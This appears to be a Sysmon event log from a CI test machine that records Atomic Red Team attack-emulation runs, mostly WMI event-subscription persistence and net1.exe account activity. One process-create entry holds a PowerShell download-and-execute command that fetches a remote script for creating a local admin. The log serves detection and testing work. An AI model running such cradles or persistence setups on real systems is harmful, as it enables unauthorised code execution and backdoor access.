"12/17/2025 8:02:25 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:25.641
ProcessGuid: {f995aebf-6391-6942-2906-000000000e00}
ProcessId: 8772
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_34mkmdjq.lzj.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:25 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:25.623
ProcessGuid: {f995aebf-6391-6942-2906-000000000e00}
ProcessId: 8772
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_34mkmdjq.lzj.ps1
CreationUtcTime: 2025-12-17 08:02:25.623
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:23.013
ProcessGuid: {f995aebf-638e-6942-2006-000000000e00}
ProcessId: 8016
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ta144dwn.my0.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:22 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:22.995
ProcessGuid: {f995aebf-638e-6942-2006-000000000e00}
ProcessId: 8016
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ta144dwn.my0.ps1
CreationUtcTime: 2025-12-17 08:02:22.995
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:22 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:22.733
ProcessGuid: {f995aebf-638e-6942-1f06-000000000e00}
ProcessId: 3244
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:22.280
ProcessGuid: {f995aebf-638e-6942-1a06-000000000e00}
ProcessId: 5996
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_giymfhko.iof.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:22 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:22.265
ProcessGuid: {f995aebf-638e-6942-1a06-000000000e00}
ProcessId: 5996
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_giymfhko.iof.ps1
CreationUtcTime: 2025-12-17 08:02:22.265
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:22 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:21.999
ProcessGuid: {f995aebf-638d-6942-1906-000000000e00}
ProcessId: 5900
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:15 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:02:13.882
ProcessGuid: {f995aebf-6385-6942-1006-000000000e00}
ProcessId: 10128
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59158
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:02:14 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:14.133
ProcessGuid: {f995aebf-6385-6942-1006-000000000e00}
ProcessId: 10128
QueryName: _ldap._tcp.dc._msdcs.WORKGROUP
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:14 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:13.976
ProcessGuid: {f995aebf-6385-6942-1006-000000000e00}
ProcessId: 10128
QueryName: _ldap._tcp.dc._msdcs.runnervm8j6r3
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:14 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:13.879
ProcessGuid: {f995aebf-6385-6942-1006-000000000e00}
ProcessId: 10128
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:14 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:14.118
ProcessGuid: {f995aebf-6386-6942-1306-000000000e00}
ProcessId: 7040
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:13 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:13.657
ProcessGuid: {f995aebf-6385-6942-1006-000000000e00}
ProcessId: 10128
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_mb4vfncx.me4.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:13 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:13.639
ProcessGuid: {f995aebf-6385-6942-1006-000000000e00}
ProcessId: 10128
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_mb4vfncx.me4.ps1
CreationUtcTime: 2025-12-17 08:02:13.639
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:13 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:13.568
ProcessGuid: {f995aebf-6385-6942-1006-000000000e00}
ProcessId: 10128
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:13 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:13.338
ProcessGuid: {f995aebf-6385-6942-0f06-000000000e00}
ProcessId: 9332
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:13 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:13.253
ProcessGuid: {f995aebf-6385-6942-0d06-000000000e00}
ProcessId: 1172
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:12 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:12.733
ProcessGuid: {f995aebf-6384-6942-0806-000000000e00}
ProcessId: 3916
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_05jhostr.rv5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:12 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:12.715
ProcessGuid: {f995aebf-6384-6942-0806-000000000e00}
ProcessId: 3916
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_05jhostr.rv5.ps1
CreationUtcTime: 2025-12-17 08:02:12.715
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:12 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:12.397
ProcessGuid: {f995aebf-6384-6942-0706-000000000e00}
ProcessId: 3012
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:12 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:10.152
ProcessGuid: {f995aebf-6381-6942-0006-000000000e00}
ProcessId: 10072
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:11 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:09.629
ProcessGuid: {f995aebf-6381-6942-fe05-000000000e00}
ProcessId: 620
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:11 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:09.104
ProcessGuid: {f995aebf-6380-6942-fc05-000000000e00}
ProcessId: 700
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:10 AM","19","WmiEventFilter activity detected:
RuleName: WmiEvent
EventType: WmiFilterEvent
UtcTime: 2025-12-17 08:02:10.188
Operation: Deleted
User: runnervm8j6r3\runneradmin
EventNamespace:  ""root\\subscription""
Name:  ""AtomicRedTeam_filter""
Query:  ""SELECT * FROM __InstanceCreationEvent Within 3 Where TargetInstance Isa \""Win32_Process\"" And Targetinstance.Name = \""notepad.exe\"" """
"12/17/2025 8:02:10 AM","20","WmiEventConsumer activity detected:
RuleName: WmiEvent
EventType: WmiConsumerEvent
UtcTime: 2025-12-17 08:02:10.186
Operation: Deleted
User: runnervm8j6r3\runneradmin
Name:  ""AtomicRedTeam_consumer""
Type: Command Line
Destination:  ""cmd.exe"""
"12/17/2025 8:02:10 AM","21","WmiEventConsumerToFilter activity detected:
RuleName: WmiEvent
EventType: WmiBindingEvent
UtcTime: 2025-12-17 08:02:10.186
Operation: Deleted
User: runnervm8j6r3\runneradmin
Consumer:  ""\\\\.\\root\\subscription:CommandLineEventConsumer.Name=\""AtomicRedTeam_consumer\""""
Filter:  ""\\\\.\\root\\subscription:__EventFilter.Name=\""AtomicRedTeam_filter\"""""
"12/17/2025 8:02:09 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:09.956
ProcessGuid: {f995aebf-6381-6942-0006-000000000e00}
ProcessId: 10072
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fta1tqul.ujc.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:09 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:09.938
ProcessGuid: {f995aebf-6381-6942-0006-000000000e00}
ProcessId: 10072
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fta1tqul.ujc.ps1
CreationUtcTime: 2025-12-17 08:02:09.938
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:09 AM","19","WmiEventFilter activity detected:
RuleName: WmiEvent
EventType: WmiFilterEvent
UtcTime: 2025-12-17 08:02:09.665
Operation: Deleted
User: runnervm8j6r3\runneradmin
EventNamespace:  ""root\\CimV2""
Name:  ""AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example""
Query:  ""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"""
"12/17/2025 8:02:09 AM","20","WmiEventConsumer activity detected:
RuleName: WmiEvent
EventType: WmiConsumerEvent
UtcTime: 2025-12-17 08:02:09.664
Operation: Deleted
User: runnervm8j6r3\runneradmin
Name:  ""AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example""
Type: Script
Destination:  ""\n Set objws = CreateObject(\""Wscript.Shell\"")\n objws.Run \""notepad.exe\"", 0, True\n """
"12/17/2025 8:02:09 AM","21","WmiEventConsumerToFilter activity detected:
RuleName: WmiEvent
EventType: WmiBindingEvent
UtcTime: 2025-12-17 08:02:09.663
Operation: Deleted
User: runnervm8j6r3\runneradmin
Consumer:  ""ActiveScriptEventConsumer.Name=\""AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example\""""
Filter:  ""__EventFilter.Name=\""AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example\"""""
"12/17/2025 8:02:09 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:09.437
ProcessGuid: {f995aebf-6381-6942-fe05-000000000e00}
ProcessId: 620
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jri0oibi.4wh.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:09 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:09.421
ProcessGuid: {f995aebf-6381-6942-fe05-000000000e00}
ProcessId: 620
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jri0oibi.4wh.ps1
CreationUtcTime: 2025-12-17 08:02:09.421
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:09 AM","19","WmiEventFilter activity detected:
RuleName: WmiEvent
EventType: WmiFilterEvent
UtcTime: 2025-12-17 08:02:09.142
Operation: Deleted
User: runnervm8j6r3\runneradmin
EventNamespace:  ""root\\CimV2""
Name:  ""AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example""
Query:  ""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"""
"12/17/2025 8:02:09 AM","20","WmiEventConsumer activity detected:
RuleName: WmiEvent
EventType: WmiConsumerEvent
UtcTime: 2025-12-17 08:02:09.139
Operation: Deleted
User: runnervm8j6r3\runneradmin
Name:  ""AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example""
Type: Command Line
Destination:  ""C:\\Windows\\System32\\notepad.exe"""
"12/17/2025 8:02:09 AM","21","WmiEventConsumerToFilter activity detected:
RuleName: WmiEvent
EventType: WmiBindingEvent
UtcTime: 2025-12-17 08:02:09.139
Operation: Deleted
User: runnervm8j6r3\runneradmin
Consumer:  ""\\\\.\\ROOT\\subscription:CommandLineEventConsumer.Name=\""AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example\""""
Filter:  ""\\\\.\\ROOT\\subscription:__EventFilter.Name=\""AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example\"""""
"12/17/2025 8:02:08 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:08.905
ProcessGuid: {f995aebf-6380-6942-fc05-000000000e00}
ProcessId: 700
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2em2jm2k.jsi.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:08 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:08.886
ProcessGuid: {f995aebf-6380-6942-fc05-000000000e00}
ProcessId: 700
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2em2jm2k.jsi.ps1
CreationUtcTime: 2025-12-17 08:02:08.886
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:03 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:03.826
ProcessGuid: {f995aebf-637b-6942-f905-000000000e00}
ProcessId: 3316
Image: C:\windows\system32\wbem\mofcomp.exe
TargetFilename: C:\Windows\System32\wbem\AutoRecover\BE941EED73FA65C764857930E033B541.mof
CreationUtcTime: 2025-12-17 08:02:03.826
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:03 AM","21","WmiEventConsumerToFilter activity detected:
RuleName: WmiEvent
EventType: WmiBindingEvent
UtcTime: 2025-12-17 08:02:03.816
Operation: Created
User: runnervm8j6r3\runneradmin
Consumer:  ""\\\\.\\root\\subscription:CommandLineEventConsumer.Name=\""AtomicRedTeam_consumer\""""
Filter:  ""\\\\.\\root\\subscription:__EventFilter.Name=\""AtomicRedTeam_filter\"""""
"12/17/2025 8:02:03 AM","19","WmiEventFilter activity detected:
RuleName: WmiEvent
EventType: WmiFilterEvent
UtcTime: 2025-12-17 08:02:03.812
Operation: Created
User: runnervm8j6r3\runneradmin
EventNamespace:  ""root\\subscription""
Name:  ""AtomicRedTeam_filter""
Query:  ""SELECT * FROM __InstanceCreationEvent Within 3 Where TargetInstance Isa \""Win32_Process\"" And Targetinstance.Name = \""notepad.exe\"" """
"12/17/2025 8:02:03 AM","20","WmiEventConsumer activity detected:
RuleName: WmiEvent
EventType: WmiConsumerEvent
UtcTime: 2025-12-17 08:02:03.810
Operation: Created
User: runnervm8j6r3\runneradmin
Name:  ""AtomicRedTeam_consumer""
Type: Command Line
Destination:  ""cmd.exe"""
"12/17/2025 8:02:03 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:03.693
ProcessGuid: {f995aebf-637b-6942-f705-000000000e00}
ProcessId: 1056
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_32uh4f4v.yk2.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:03 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:03.675
ProcessGuid: {f995aebf-637b-6942-f705-000000000e00}
ProcessId: 1056
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_32uh4f4v.yk2.ps1
CreationUtcTime: 2025-12-17 08:02:03.675
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:03 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:01.602
ProcessGuid: {f995aebf-6379-6942-f305-000000000e00}
ProcessId: 4404
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:03 AM","21","WmiEventConsumerToFilter activity detected:
RuleName: WmiEvent
EventType: WmiBindingEvent
UtcTime: 2025-12-17 08:02:03.380
Operation: Created
User: runnervm8j6r3\runneradmin
Consumer:  ""\\\\.\\ROOT\\subscription:CommandLineEventConsumer.Name=\""AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example\""""
Filter:  ""\\\\.\\ROOT\\subscription:__EventFilter.Name=\""AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example\"""""
"12/17/2025 8:02:03 AM","21","WmiEventConsumerToFilter activity detected:
RuleName: WmiEvent
EventType: WmiBindingEvent
UtcTime: 2025-12-17 08:02:03.378
Operation: Created
User: runnervm8j6r3\runneradmin
Consumer:  ""ActiveScriptEventConsumer.Name=\""AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example\""""
Filter:  ""__EventFilter.Name=\""AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example\"""""
"12/17/2025 8:02:02 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:02.758
ProcessGuid: {f995aebf-5508-6942-eb03-000000000000}
ProcessId: 4
Image: System
TargetFilename: C:\Windows\System32\LogFiles\WMI\RtBackup\EtwRTAdmin_PS_Provider.etl
CreationUtcTime: 2025-12-17 08:02:02.757
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:02:01 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:01.958
ProcessGuid: {f995aebf-5508-6942-eb03-000000000000}
ProcessId: 4
Image: System
TargetFilename: C:\Windows\System32\LogFiles\WMI\RtBackup\EtwRTTerminal-Services-LSM-ApplicationLag-4924.etl
CreationUtcTime: 2025-12-17 08:02:01.958
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:02:01 AM","20","WmiEventConsumer activity detected:
RuleName: WmiEvent
EventType: WmiConsumerEvent
UtcTime: 2025-12-17 08:02:01.628
Operation: Created
User: runnervm8j6r3\runneradmin
Name:  ""AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example""
Type: Script
Destination:  ""\n Set objws = CreateObject(\""Wscript.Shell\"")\n objws.Run \""notepad.exe\"", 0, True\n """
"12/17/2025 8:02:01 AM","19","WmiEventFilter activity detected:
RuleName: WmiEvent
EventType: WmiFilterEvent
UtcTime: 2025-12-17 08:02:01.616
Operation: Created
User: runnervm8j6r3\runneradmin
EventNamespace:  ""root\\CimV2""
Name:  ""AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example""
Query:  ""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"""
"12/17/2025 8:02:01 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:01.404
ProcessGuid: {f995aebf-6379-6942-f305-000000000e00}
ProcessId: 4404
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kt2up5xh.fjt.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:01 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:01.380
ProcessGuid: {f995aebf-6379-6942-f305-000000000e00}
ProcessId: 4404
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kt2up5xh.fjt.ps1
CreationUtcTime: 2025-12-17 08:02:01.380
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:01:55 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:55.356
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:55 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:55.261
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:55 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:55.166
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:55 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:55.073
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:54 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:54.990
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:54 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:01:54.907
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:01:54 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
